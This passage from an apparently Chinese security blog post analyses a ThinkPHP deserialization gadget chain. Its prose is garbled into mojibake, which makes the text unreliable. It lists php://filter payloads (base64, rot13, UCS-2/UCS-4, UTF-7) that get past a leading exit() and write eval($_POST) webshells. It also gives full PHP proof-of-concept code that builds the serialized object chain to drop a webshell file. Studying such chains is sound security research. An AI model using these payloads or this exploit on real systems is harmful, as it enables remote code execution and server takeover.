/></p><p>æ–‡ä»¶å†™å…¥çš„æ—¶å€™ï¼Œæœ‰exitï¼Œè¿™ä¸ªçœ‹pç‰›çš„æ–‡ä»¶å†™å…¥ç»•æ­»äº¡exitå°±è¡Œäº†ã€‚</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h4 id="4æ„é€ å®Œæ•´åˆ©ç”¨é“¾"><a class="markdownIt-Anchor" href="#4æ„é€ å®Œæ•´åˆ©ç”¨é“¾"></a> 4.æ„é€ å®Œæ•´åˆ©ç”¨é“¾</h4><p><strong>åˆ†æå¦‚ä½•æ‰èƒ½è°ƒç”¨__callæ–¹æ³•</strong></p><p>ä¸»è¦æœ‰å››ä¸ªifé€»è¾‘ï¼Œæœ€åè®©æœ€ä¸‹é¢çš„$valueä¸ºæƒ³è°ƒç”¨__callæ–¹æ³•çš„ç±»å³å¯ï¼Œå…ˆåˆ†æifé€»è¾‘ï¼Œååˆ†æèµ‹å€¼é€»è¾‘</p><ul><li>$relationè¦ä¸ºModelç±»è‡ªå¸¦çš„æ–¹æ³•åç§°</li><li>æ‰§è¡ŒModelç±»çš„æ–¹æ³•åï¼Œè·å–çš„ç±»ï¼Œæ–¹æ³•è¦å­˜åœ¨getBindAttr</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>A</mi><mi>t</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">å‚</mi><mi mathvariant="normal">æ•°</mi><mi mathvariant="normal">è¦</mi><mi mathvariant="normal">ä¸</mi><mi mathvariant="normal">ä¸º</mi><mi mathvariant="normal">ç©º</mi><mi mathvariant="normal">ï¼Œ</mi><mi mathvariant="normal">ä¹Ÿ</mi><mi mathvariant="normal">å°±</mi><mi mathvariant="normal">æ˜¯</mi></mrow><annotation encoding="application/x-tex">bindAttrå‚æ•°è¦ä¸ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">A</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">å‚</span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">è¦</span><span class="mord cjk_fallback">ä¸</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">ç©º</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¹Ÿ</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span></span></span></span>modelRelationç±»è¦å­˜åœ¨getBindAttræ–¹æ³•è¦æœ‰è¿”å›å€¼</li><li>ä¸è®¾ç½®data[$key]çš„å€¼</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911174406671.png" alt="image-20240911174406671" /></p><p>å˜é‡èµ‹å€¼å¯¹åº”ç€å³è¾¹çš„ä¸‰ä¸ªæ–¹æ³•</p><ul><li>ç¬¬ä¸€å¤„parseNameæ–¹æ³•ä»…åšå¤§å°å†™æ›¿æ¢æ“ä½œï¼Œ$relationå¯æ§</li><li>ç¬¬äºŒå¤„è°ƒç”¨è¯¥ç±»è‡ªå·±çš„æ–¹æ³•ï¼Œè¿™é‡Œæ‰¾åˆ°äº†getErroræ–¹æ³•ï¼Œå› ä¸ºæ–¹æ³•çš„è¿”å›å€¼æ˜¯å¯æ§çš„ï¼Œ$modelRelationå¯æ§</li><li>ç¬¬ä¸‰å¤„è°ƒç”¨çš„æ–¹æ³•è·Ÿè¿›å»ï¼Œåœ¨ç¬¬ä¸€ä¸ªifé€»è¾‘ï¼Œè¿”å›å€¼ä¸ºthis-&gt;parentï¼Œå¯æ§ã€‚</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911175535696.png" alt="image-20240911175535696" /></p><p>åˆ†æä¸€ä¸‹ç¬¬ä¸‰å¤„çš„æ–¹æ³•çš„ifé€»è¾‘</p><ul><li>ç¬¬ä¸€å¤„è¿”å›å€¼å¯æ§</li><li>ç¬¬äºŒå¤„æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ä¸ªå¯æ§çš„getModelæ–¹æ³•çš„ç±»ï¼Œåœ¨ä¸‹æ–¹çš„Queryç±»å³å¯æ‰¾åˆ°å¯æ§çš„ã€‚</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181833527.png" alt="image-20240911181833527" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911181623160.png" alt="image-20240911181623160" /></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç¬¦åˆRelationå­ç±»äº†ï¼Œè¿™ä¸ªç±»è¿˜è¦æœ‰getBindAttræ–¹æ³•</p><p>æ‰¾åˆ°äº†OneToOneç±»ï¼ŒåŒæ—¶è¿™é‡Œçš„bindAttrå‚æ•°ä¹Ÿæ˜¯å¯æ§çš„ï¼Œè¿™æ ·æœ€å¼€å§‹çš„é€»è¾‘ä¹Ÿèƒ½è¿›å»äº†ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182518131.png" alt="image-20240911182518131" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240911182354185.png" alt="image-20240911182354185" /></p><p>è¿™ä¸‹callé­”æœ¯æ–¹æ³•å·²ç»å¯ä»¥æ­£å¸¸è°ƒç”¨åˆ°äº†</p><p>åé¢çš„callé­”æœ¯æ–¹æ³•è§¦å‘seté€»è¾‘å¾ˆç®€å•ï¼Œæ²¡æœ‰ifä¹‹ç±»çš„é€»è¾‘ï¼Œé—®é¢˜åœ¨ç»•è¿‡æ­»äº¡exitçš„åœ°æ–¹ã€‚</p><h3 id="äºŒ-æ­»äº¡exitç»•è¿‡"><a class="markdownIt-Anchor" href="#äºŒ-æ­»äº¡exitç»•è¿‡"></a> äºŒã€æ­»äº¡exitç»•è¿‡</h3><p>è¿™ä¸ªåœ¨pç‰›çš„åšå®¢å·²ç»å†™è¿‡äº†ï¼Œç®€å•æ¥è¯´å°±æ˜¯filenameå¯æ§çš„æ—¶å€™ï¼Œä½¿ç”¨php://filterä¼ªåè®®ä¼šæŠŠcontentç¼–ç å¤„ç†ï¼Œè¿™æ ·exitå°±ä¸ä¼šå†™åˆ°æ–‡ä»¶ä¸­äº†ã€‚</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112011325.png" alt="image-20240912112011325" /></p><p>pğŸ‚è¿™é‡Œç»™çš„ä¾‹å­æ˜¯å‡½æ•°ä¸¤ä¸ªå‚æ•°å‡å¯æ§çš„æ—¶å€™ï¼Œå¦‚æœfilenameå’Œcontentä¸ºä¸€ä¸ªå‚æ•°æ—¶</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$content &#x3D; $_GET[content];file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p>çœ‹ä¸€ä¸‹è¿™ç¯‡åšå®¢ã€‚</p><p><strong>ç®€å•å­¦ä¹ å’Œæ€»ç»“ä¸€ä¸‹ï¼š</strong></p><ol><li>æˆ‘ä»¬æƒ³åˆ°çš„ç¬¬ä¸€ç§æ–¹å¼å°±æ˜¯ä¾æ—§å’Œä¸Šé¢ä¸€æ ·çš„æ€è·¯ï¼Œä½¿ç”¨base64è¿‡æ»¤å™¨</li></ol><p><code>php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=s1mple.php</code>æˆ–è€…<code>php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></p><p>è¿™æ ·å†™å…¥çš„å†…å®¹åº”è¯¥æ˜¯&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.phpçš„base64è§£ç ï¼Œä½†æ˜¯å®é™…ä¼šç”Ÿæˆæ–‡ä»¶ï¼Œä½†æ— æ³•å†™å…¥å†…å®¹ã€‚å› ä¸ºbase64åœ¨=åé¢ä¸èƒ½å­˜åœ¨å­—ç¬¦ã€‚</p><ol start="2"><li>å› æ­¤æƒ³åŠæ³•å»æ‰=å³å¯ï¼Œå¯»æ‰¾å¯ç”¨çš„phpçš„è¿‡æ»¤å™¨ã€‚</li></ol><p>string.strip.tagsè¿‡æ»¤å™¨ï¼Œå»é™¤htmlå’Œphpæ ‡ç­¾ï¼ˆåœ¨php7.3åæ— æ³•ä½¿ç”¨ï¼‰</p><p>è¿™æ ·å¾—åˆ°äº†ä¸€ä¸ªpayloadï¼š</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></p><p>ä½†è¿™æ ·å†™ï¼Œæ–‡ä»¶åå­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼ŒWindowsä¸‹é¢æ— æ³•åˆ›å»ºæ–‡ä»¶</p><p>Linuxæµ‹è¯•ä¸€ä¸‹</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142115389.png" alt="image-20240913142115389" /></p><p>åˆ©ç”¨è·¨ç›®å½•æ§åˆ¶æ–‡ä»¶åã€‚</p><p><code>php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../1.php</code></p><p><strong>è¿™ä¸ªåœ¨Windowsç¯å¢ƒä¸‹åšæµ‹è¯•å±…ç„¶å¤±è´¥äº†ï¼Œéš¾é“æ˜¯è·¨ç›®å½•çš„é—®é¢˜ï¼Ÿæš‚æ—¶æ²¡ç ”ç©¶äº†</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913142520525.png" alt="image-20240913142520525" /></p><ol start="3"><li>è€ƒè™‘ä½¿ç”¨å…¶ä»–ç¼–ç ç±»çš„è¿‡æ»¤å™¨ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…=å¸¦æ¥çš„é—®é¢˜äº†ã€‚</li></ol><p><code>php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=1.php</code></p><p>ä½¿ç”¨rot13å‡¯æ’’ï¼ŒåŒæ—¶phpå¯»æ‰¾ä¸åˆ°è¿‡æ»¤å™¨åªä¼šæŠ›å‡ºè­¦å‘Šï¼Œæ‰€ä»¥æˆ‘ä»¬çš„payloadå¯ä»¥æ”¾åœ¨è¿‡æ»¤å™¨çš„ä½ç½®ï¼ˆ<strong>ä½†æ— æ³•åœ¨tpä¸­ä½¿ç”¨ï¼Œtpä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</strong>ï¼‰</p><p>æœ€ç»ˆç»“æœå¦‚ä¸‹ï¼š</p><p>å¦‚æœphpä¸å¼€å¯çŸ­æ ‡ç­¾çš„è¯ï¼Œå‰é¢çš„&lt;?éƒ¨åˆ†å°±ä¼šè¢«å¿½ç•¥ï¼Œä¸ä¼šå½±å“è§£æ</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143441913.png" alt="image-20240913143441913" /></p><ol start="4"><li>ä¸Šé¢çš„rot13åœ¨çŸ­æ ‡ç­¾å¼€å¯çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œæ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨è‡ªå¸¦çš„iconvçš„è¿‡æ»¤å™¨</li></ol><p>usc-2è¿‡æ»¤å™¨ï¼šä¸¤ä½ä¸€åè½¬</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913143814907.png" alt="image-20240913143814907" /></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=12.php</code></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144253027.png" alt="image-20240913144253027" /></p><p>usc-4è¿‡æ»¤å™¨ï¼šå››ä½ä¸€åè½¬</p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913144542973.png" alt="image-20240913144542973" /></p><p>UTFç¼–ç è½¬æ¢ï¼š</p><p>å¯ä»¥æŠŠ=åšç¼–ç è½¬æ¢ï¼Œè¿™æ ·åœ¨è®¾ç½®base64è§£ç çš„æ—¶å€™å°±ä¸å†å—åˆ°å½±å“äº†</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913151647177.png" alt="image-20240913151647177" /></p><p>è¿ç”¨åˆ°TPä¸Šfilterçš„ä½ç½®å°±ä¸èƒ½æ”¾payloadäº†ï¼ŒTPä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå› æ­¤éœ€è¦æ”¹ä¸€ä¸‹payloadçš„ä½ç½®</p><p><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php</code></p><p>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+ï¼Œæ­£å¸¸çš„base64çš„payloadæ˜¯è¿™æ ·çš„ï¼Œå®é™…æƒ…å†µè¦æ ¹æ®å‰é¢çš„å­—ç¬¦æ•°é‡ï¼Œåœ¨payloadçš„å‰é¢å¢åŠ å­—ç¬¦åšå¡«å……ï¼Œè¿™æ ·æ‰èƒ½è®©æœ€ç»ˆbase64è§£ç çš„æ—¶å€™åˆšå¥½è§£ç åˆ°è¿™ä¸ªåœ°æ–¹ã€‚</p><p>çœ‹å›æºç ï¼Œè¿™é‡Œçš„filenameå‚æ•°æ˜¯å¯æ§çš„ï¼Œå› æ­¤ç†è®ºä¸Šåº”è¯¥å¯ä»¥ç»•è¿‡æ­»äº¡exit</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240912112341564.png" alt="image-20240912112341564" /></p><h3 id="ä¸‰-pocç¼–å†™"><a class="markdownIt-Anchor" href="#ä¸‰-pocç¼–å†™"></a> ä¸‰ã€POCç¼–å†™</h3><p>å†™pocæ³¨æ„ä¸€ä¸‹ThinkPHPçš„å‘½åç©ºé—´</p><p>Thinkphpå‘½åç©ºé—´å®é™…ä¸Šä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå¯ä»¥ç†è§£æˆä¸€ä¸ªæ¨¡å—åŒ–çš„å®šä¹‰ã€‚Aæ¨¡å—çš„æ–¹æ³•è°ƒç”¨Bæ¨¡å—é‡Œé¢çš„æ–¹æ³•ï¼Œå¸¦ç€æ¨¡å—åè®¿é—®åˆå§‹åŒ–å°±å¯ä»¥äº†ã€‚</p><p>å…ˆæŒ‰ç…§ä¸Šé¢åˆ†æçš„æ€è·¯ç¼–å†™ä¸€ä¸ªpoc:</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;class Windows&#123;private $files &#x3D; [];function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;&#x2F;&#x2F; Windowsç±»ï¼Œå…¥å£ååºåˆ—åŒ–è§¦å‘toString&#x2F;&#x2F;Pivotç±»ï¼ŒModelç±»çš„å­ç±»ï¼Œè§¦å‘__callæ–¹æ³•namespace think\model&#123;class Pivot&#123;protected $append &#x3D; [&quot;1&quot;&#x3D;&gt;&quot;getError&quot;];protected $error;protected $parent;function __construct($a,$b)&#123;$this-&gt;error &#x3D; $a;$this-&gt;parent &#x3D; $b;&#125;&#125;&#125;&#x2F;&#x2F; HasOneç±»ï¼ŒRelationç±»çš„å­ç±»ï¼Œè§¦å‘ifæ¡ä»¶éœ€è¦namespace think\model\relation&#123;class HasOne&#123;protected $selfRelation &#x3D; false;protected $query;protected $bindAttr &#x3D; [&#39;1&#39;&#x3D;&gt;1];function __construct($a)&#123;$this-&gt;query &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; Queryç±»ï¼Œä¸ºäº†ç¬¦åˆä¸Šé¢çš„getModelæ¡ä»¶namespace think\db&#123;class Query&#123;protected $model;function __construct($a)&#123;$this-&gt;model &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; __callæ–¹æ³•è§¦å‘ç±»namespace think\console&#123;class Output&#123;protected $styles &#x3D; [&quot;getAttr&quot;];private $handle;function __construct($a)&#123;$this-&gt;handle &#x3D; $a;&#125;&#125;&#125;namespace think\session\driver&#123;class Memcached&#123;protected $handler;function __construct($a)&#123;$this-&gt;handler &#x3D; $a;&#125;&#125;&#125;namespace think\cache\driver&#123;class File&#123;protected $options &#x3D; [&#39;path&#39; &#x3D;&gt; &#39;&#39;, &#x2F;&#x2F; è¿™é‡Œæ˜¯filenameéƒ¨åˆ†&#39;expire&#39; &#x3D;&gt; &#39;0&#39;,&#39;cache_subdir&#39; &#x3D;&gt; &#39;0&#39;,&#39;prefix&#39; &#x3D;&gt; &#39;0&#39;,&#39;data_compress&#39; &#x3D;&gt; false];&#125;&#125;namespace&#123;$fileObj &#x3D; new \think\cache\driver\File();$memObj &#x3D; new \think\session\driver\Memcached($fileObj);$outputObj &#x3D; new \think\console\Output($memObj);$queryObj &#x3D; new \think\db\Query($outputObj);$hasoneObj &#x3D; new think\model\relation\HasOne($queryObj);$pivotObj &#x3D; new think\model\Pivot($hasoneObj, $outputObj);$windows &#x3D; new think\process\pipes\Windows($pivotObj);echo base64_encode(serialize($windows));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>debugçœ‹ä¸€ä¸‹ï¼ŒæˆåŠŸæ§åˆ¶filenameéƒ¨åˆ†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯contentéƒ¨åˆ†ï¼Œçœ‹ä¸€ä¸‹æ˜¯å¦å¯æ§äº†ï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913102139582.png" alt="image-20240913102139582" /></p><p>å‘ç°æœ€åˆè°ƒsetçš„æ—¶å€™ï¼Œå‚æ•°å†…å®¹å°±ä¸å¯æ§ï¼Œå†™æ­»ä¸ºäº†true</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913103110896.png" alt="image-20240913103110896" /></p><p>æ²¡åŠæ³•ï¼Œåªèƒ½å°è¯•å¯»æ‰¾å…¶ä»–è°ƒç”¨setæ–¹æ³•çš„åœ°æ–¹ï¼Œä¸”setæ–¹æ³•çš„å‚æ•°valueéƒ¨åˆ†å¯æ§ã€‚</p><p>åœ¨ä¸‹é¢çš„æ“ä½œé€»è¾‘ä¸­ï¼Œåˆšå¥½æœ‰ä¸€å¤„è°ƒç”¨setæ–¹æ³•çš„åœ°æ–¹ï¼Œåˆ†æä¸€ä¸‹valueå‚æ•°ï¼Œå‘ç°å°±æ˜¯ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯filenameã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913104405600.png" alt="image-20240913104405600" /></p><p>å› æ­¤æˆ‘ä»¬å®é™…ä¸Šå¾—åˆ°äº†ä¸€ä¸ªfilenameå’Œcontentå­˜åœ¨ç›¸åŒå˜é‡çš„æ­»äº¡exitåœºæ™¯ã€‚</p><p>è¿™ä¸ªåœºæ™¯æˆ‘ä»¬ä¸Šé¢è®¨è®ºè¿‡äº†ï¼Œå› æ­¤ä¿®æ”¹ä¸€ä¸‹expï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Windowsç±»ï¼Œå…¥å£ååºåˆ—åŒ–è§¦å‘toString</span><span class="token comment">//Pivotç±»ï¼ŒModelç±»çš„å­ç±»ï¼Œè§¦å‘__callæ–¹æ³•</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// HasOneç±»ï¼ŒRelationç±»çš„å­ç±»ï¼Œè§¦å‘ifæ¡ä»¶éœ€è¦</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HasOne</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Queryç±»ï¼Œä¸ºäº†ç¬¦åˆä¸Šé¢çš„getModelæ¡ä»¶</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// __callæ–¹æ³•è§¦å‘ç±»</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"getAttr"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=111PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'expire'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cache_subdir'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$tag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$fileObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$memObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$fileObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$outputObj</span> <span class="token operator">=</span> <span class="token 